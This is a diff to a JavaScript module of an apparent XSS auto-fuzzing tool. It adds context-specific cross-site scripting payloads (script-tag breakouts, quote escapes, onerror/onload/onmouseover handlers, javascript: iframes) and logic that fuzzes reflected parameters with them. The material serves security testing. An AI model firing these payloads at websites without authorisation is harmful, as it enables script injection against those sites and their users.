@@ -15,6 +15,48 @@ var AUTO_FUZZ_PAYLOADS = [
   { name: '纯文本探针', value: 'vkfuzzprobe123' },
 ];
 
+var CONTEXT_PAYLOADS = {
+  script: [
+    { name: '闭合 script 标签', value: '</script><script>alert(1)</script>' },
+    { name: '模板字面量注入', value: '${alert(1)}' },
+    { name: '表达式闭合', value: ';alert(1)//' },
+    { name: '字符串闭合执行', value: "';alert(1);//" },
+    { name: '反引号注入', value: '`;alert(1);//' },
+    { name: 'JS 注释绕过', value: '*/alert(1);/*' },
+  ],
+  attributeValue: [
+    { name: '双引号逃逸', value: '"><img src=x onerror=alert(1)>' },
+    { name: '单引号逃逸', value: "'><img src=x onerror=alert(1)>" },
+    { name: '双引号事件注入', value: '" onmouseover=alert(1) "' },
+    { name: '单引号事件注入', value: "' onmouseover=alert(1) '" },
+    { name: '双引号 SVG', value: '"><svg onload=alert(1)>' },
+    { name: '双引号 script', value: '"><script>alert(1)</script>' },
+  ],
+  attribute: [
+    { name: '闭合标签注入', value: '><img src=x onerror=alert(1)>' },
+    { name: 'SVG 注入', value: '><svg onload=alert(1)>' },
+    { name: 'script 注入', value: '><script>alert(1)</script>' },
+    { name: '事件属性', value: ' onmouseover=alert(1) ' },
+    { name: 'onfocus 事件', value: ' onfocus=alert(1) autofocus ' },
+    { name: 'iframe 注入', value: '><iframe src="javascript:alert(1)">' },
+  ],
+  tag: [
+    { name: '标签闭合 script', value: '"><script>alert(1)</script>' },
+    { name: '标签闭合 img', value: '"><img src=x onerror=alert(1)>' },
+    { name: '标签闭合 SVG', value: '"><svg onload=alert(1)>' },
+    { name: '标签闭合 body', value: '"></body><body onload=alert(1)>' },
+    { name: '标签闭合 iframe', value: '"><iframe src="javascript:alert(1)">' },
+  ],
+  htmlText: [
+    { name: 'script 标签', value: '<script>alert(1)</script>' },
+    { name: 'img onerror', value: '<img src=x onerror=alert(1)>' },
+    { name: 'SVG onload', value: '<svg onload=alert(1)>' },
+    { name: 'body onload', value: '</body><body onload=alert(1)>' },
+    { name: 'iframe', value: '<iframe src="javascript:alert(1)">' },
+    { name: 'a href 注入', value: '<a href="javascript:alert(1)">click</a>' },
+  ],
+};
+
 var PROBE_PAYLOAD = 'vkprobe\'\\"><xyz';
 
 var autofuzzState = {
@@ -91,6 +133,19 @@ function buildTestCases(points, payloads) {
     });
   });
   return cases;
+}
+
+function getPayloadsForContext(probeContext) {
+  if (!probeContext) return AUTO_FUZZ_PAYLOADS;
+  var ctx = probeContext.toLowerCase();
+  if (ctx.indexOf('<script') !== -1) return CONTEXT_PAYLOADS.script;
+  if (ctx.indexOf('attribute value') !== -1 || ctx.indexOf('quote breakout') !== -1)
+    return CONTEXT_PAYLOADS.attributeValue;
+  if (ctx.indexOf('attribute') !== -1) return CONTEXT_PAYLOADS.attribute;
+  if (ctx.indexOf('tag context') !== -1 || ctx.indexOf('tag injection') !== -1)
+    return CONTEXT_PAYLOADS.tag;
+  if (ctx.indexOf('html text') !== -1) return CONTEXT_PAYLOADS.htmlText;
+  return AUTO_FUZZ_PAYLOADS;
 }
 
 function batchFetchAndCheck(tabId, testCases, timeoutMs) {
@@ -311,32 +366,39 @@ async function runAutoFuzz(points, concurrency, onProgress) {
       phase: 'phase2',
     });
 
-  // Phase 2: Diverse payloads on reflected points
+  // Phase 2: Context-aware payloads on reflected points
   autofuzzState.phase = 'phase2';
-  var phase2Cases = buildTestCases(
-    reflectedPoints.map(function (rp) {
-      return rp.point;
-    }),
-    AUTO_FUZZ_PAYLOADS
-  );
 
-  var phase2Results = await batchFetchAndCheck(tab.id, phase2Cases, timeout);
+  var allPhase2Cases = [];
+  var pointCaseRanges = [];
+
+  reflectedPoints.forEach(function (rp) {
+    var payloads = getPayloadsForContext(rp.probeContext);
+    var startIdx = allPhase2Cases.length;
+    var cases = buildTestCases([rp.point], payloads);
+    allPhase2Cases = allPhase2Cases.concat(cases);
+    pointCaseRanges.push({ startIdx: startIdx, count: cases.length, payloads: payloads });
+  });
+
+  var phase2Results = await batchFetchAndCheck(tab.id, allPhase2Cases, timeout);
 
   for (var j = 0; j < reflectedPoints.length; j++) {
     if (autofuzzState.aborted) break;
     var rp = reflectedPoints[j];
+    var range = pointCaseRanges[j];
+    var payloads = range.payloads;
     var payloadResults = [];
     var bestSeverity = 'info';
     var bestContext = '';
 
-    for (var k = 0; k < AUTO_FUZZ_PAYLOADS.length; k++) {
-      var caseIdx = j * AUTO_FUZZ_PAYLOADS.length + k;
-      var tc = phase2Cases[caseIdx];
+    for (var k = 0; k < payloads.length; k++) {
+      var caseIdx = range.startIdx + k;
+      var tc = allPhase2Cases[caseIdx];
       if (!tc) continue;
       var res = phase2Results[tc.id];
       var pr = {
         payloadName: tc.payloadName,
-        payloadValue: AUTO_FUZZ_PAYLOADS[k].value,
+        payloadValue: payloads[k].value,
         reflected: !!(res && res.reflected),
         context: res && res.context ? res.context : '',
         error: res && res.error ? res.error : '',
@@ -355,6 +417,7 @@ async function runAutoFuzz(points, concurrency, onProgress) {
       point: rp.point,
       severity: bestSeverity,
       context: bestContext,
+      probeContext: rp.probeContext,
       payloadResults: payloadResults,
       reflectedCount: payloadResults.filter(function (p) {
         return p.reflected;
@@ -364,7 +427,14 @@ async function runAutoFuzz(points, concurrency, onProgress) {
 
     if (onProgress)
       onProgress({
-        text: 'Phase 2: ' + (j + 1) + '/' + reflectedPoints.length + ' 反射点分析完成',
+        text:
+          'Phase 2: ' +
+          (j + 1) +
+          '/' +
+          reflectedPoints.length +
+          ' 反射点分析完成 (上下文: ' +
+          (rp.probeContext || 'unknown') +
+          ')',
         phase: 'phase2',
       });
   }
@@ -702,6 +772,7 @@ function getAutoFuzzFindings() {
 
 export {
   AUTO_FUZZ_PAYLOADS,
+  CONTEXT_PAYLOADS,
   autofuzzState,
   runAutoFuzz,
   stopAutoFuzz,
@@ -710,4 +781,5 @@ export {
   generatePocHtml,
   getAutoFuzzFindings,
   scoreFinding,
+  getPayloadsForContext,
 };
